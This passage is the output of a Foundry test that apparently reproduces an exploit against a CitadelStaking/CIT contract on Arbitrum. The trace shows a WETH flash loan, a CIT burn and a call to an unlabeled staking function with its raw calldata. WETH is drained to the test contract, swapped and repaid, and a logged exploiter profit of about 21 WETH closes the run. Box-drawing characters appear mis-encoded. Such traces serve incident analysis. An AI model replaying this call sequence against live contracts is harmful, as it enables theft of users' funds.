    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000158ca19e5a1add5c8
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [123806666 [1.238e8], 24844698768393491912 [2.484e19]]
    в”‚   в”‚   в”‚   в”њв”Ђ [10049] CIT::burn(CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], 30951666666666666666 [3.095e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], to: 0x0000000000000000000000000000000000000000, value: 30951666666666666666 [3.095e19])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [25189] CitadelStaking::46ded4d1(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000043cf1856606df2cb22aedba1a3e23725f1594e810000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000001ad8a68d828f72aaa)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [41033] 0x5ed32847e33844155c18944Ae84459404e432620::45589883(00000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab100000000000000000000000000000000000000000000000158ca19e5a1add5c80000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 72668070516983737917 [7.266e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 72668070516983737917 [7.266e19]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [26900] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24844698768393491912 [2.484e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [26154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24844698768393491912 [2.484e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x5ed32847e33844155c18944Ae84459404e432620, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24844698768393491912 [2.484e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 474482066942 [4.744e11]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 474482066942 [4.744e11]
    в”‚   в”‚   в”њв”Ђ [27939] USDC::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 474482066942 [4.744e11])
    в”‚   в”‚   в”‚   в”њв”Ђ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 474482066942 [4.744e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 474482066942 [4.744e11])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 474482066942 [4.744e11]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 474482066942 [4.744e11]
    в”‚   в”‚   в”њв”Ђ [42273] CamelotRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(474482066942 [4.744e11], 0, [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1706348536 [1.706e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [7663] USDC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 474482066942 [4.744e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6911] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 474482066942 [4.744e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 474482066942 [4.744e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24844698768393491912 [2.484e19]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24844698768393491912 [2.484e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21], 23329776441 [2.332e10], 300
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 497811843383 [4.978e11]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 497811843383 [4.978e11]
    в”‚   в”‚   в”‚   в”њв”Ђ [1736] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(474482066942 [4.744e11], USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000f3e076040b357b1399
    в”‚   в”‚   в”‚   в”њв”Ђ [21517] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(4498732929469357167513 [4.498e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4200] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4498732929469357167513 [4.498e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4498732929469357167513 [4.498e21]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4498732929469357167513 [4.498e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 221863483531587856776 [2.218e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 221863483531587856776 [2.218e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 497811843383 [4.978e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 497811843383 [4.978e11]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 497811843383 [4.978e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 497811843383 [4.978e11]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 221863483531587856776 [2.218e20], reserve1: 497811843383 [4.978e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 0, amount1In: 474482066942 [4.744e11], amount0Out: 4498732929469357167513 [4.498e21], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4523577628237750659425 [4.523e21]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4523577628237750659425 [4.523e21]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4200] WETH::transfer(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], 4502250000000000000000 [4.502e21])
    в”‚   в”‚   в”‚   в”њв”Ђ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], 4502250000000000000000 [4.502e21]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], value: 4502250000000000000000 [4.502e21])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ emit log_string(val: "--------------------End attack--------------------")
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [1296] WETH::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4953325593957827651289 [4.953e21]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 4953325593957827651289 [4.953e21]
    в”‚   в”њв”Ђ [1296] USDC::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376827407693 [1.137e13]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376827407693 [1.137e13]
    в”‚   в”њв”Ђ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 4500000000000000000000 [4.5e21], param3: 0, param4: 2250000000000000000 [2.25e18], param5: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [1296] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 21327628237750659425 [2.132e19]
    в”‚   в””в”Ђ в†ђ [Return] 21327628237750659425 [2.132e19]
    в”њв”Ђ [267] CIT::decimals() [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Exploiter WETH balance after attack", val: 21327628237750659425 [2.132e19], decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.97s (12.80s CPU time)

Ran 2 test suites in 14.21s (14.44s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
